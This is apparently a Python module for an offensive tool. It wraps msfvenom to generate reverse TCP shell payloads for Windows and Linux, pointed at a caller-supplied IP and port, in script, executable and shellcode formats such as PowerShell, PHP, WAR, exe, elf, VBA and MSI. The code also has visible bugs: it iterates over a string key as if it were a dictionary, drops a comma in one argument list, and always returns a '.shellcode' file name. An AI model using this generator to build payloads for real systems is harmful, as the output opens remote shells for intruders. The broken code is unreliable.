import subprocess
import random


class Artifact_generator:
    def __init__(self, os, style, _format, ip, port, encoding, output, verbose):

        self.os = os
        self.style = style
        self.output = output
        self.verbose = verbose
        self.encoding = encoding
        self.extension = _format

        self.format_type = None

        self.ip = ip
        self.port = port
        self.name = "artifact_"
        
        # TODO explore other options here aswell
        self.available_platforms = [
            "windows/x64/shell_reverse_tcp",
            "windows/x32/shell_reverse_tcp",
            "linux/x64/shell_reverse_tcp",
            "linux/x32/shell_reverse_tcp"
        ]
        
        # TODO add conversion between formats

        self.formats_dict = {
                "script" : {
                "ps1"  : "powershell",
                "py"   : "python",
                "pl"   : "perl",
                "sh"   : "bash",
                "js"   : "js",
                "asp"  : "asp",
                "jsp"  : "jsp",
                "war"  : "war",
                "php"  : "php",
                "html" : "html"
            },

                "executable" : {
                "exe"   : "exe",
                "elf"   : "elf",
                "macho" : "macho"
            },

                "shellcode" : {
                "raw"      : "raw",
                "c"        : "c",
                "msi"      : "msi",
                "vba"      : "vba",
                "vbscript" : "vbscript"
            }}
        
        for platform in self.available_platforms:
            if self.os in platform:
                self.os = platform
        
        for kl_format, vl_format in self.formats_dict.items():
            for k_format, v_format in kl_format.items():
                if self.extension == k_format:
                    self.format = kl_format
                    break

    def msfvenom_generator(self):
        """ Generates the artifact using msfvenom """

        # Creates a random numbered name #
        for _ in range(6):
            self.name+=str(random.randint(0,9))
        
        if self.output == 'sc':
            command = [
                "msfvenom", "-p", f"{self.os}", f"LHOST={self.ip}", f"LPORT={self.port}",
                "-f", f"{self.formats_dict['script'][self.extension]}", 
                "-v", f"{self.output}", "-o" f"{self.name}.shellcode" 
            ]        

        elif self.format == 'script': 
            command = [
               "msfvenom", "-p", f"{self.os}", f"LHOST={self.ip}", f"LPORT={self.port}", 
               "-f", f"{self.formats_dict['script'][self.extension]}",
               "-o", f"{self.name}.{self.extension}"
            ]

        elif self.format == 'executable':
            command = [
               "msfvenom", "-p", f"{self.os}", f"LHOST={self.ip}", f"LPORT={self.port}", 
               "-f", f"{self.formats_dict['executable'][self.extension]}",
               "-o", f"{self.name}.{self.extension}"
            ]

        elif self.format == 'shellcode':
            command = [
               "msfvenom", "-p", f"{self.os}", f"LHOST={self.ip}", f"LPORT={self.port}", 
               "-f", f"{self.formats_dict['shellcode'][self.extension]}",
               "-o", f"{self.name}.{self.extension}"
            ]

        process = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        return f"{self.name}.shellcode"


if __name__ == '__main__':
    pass
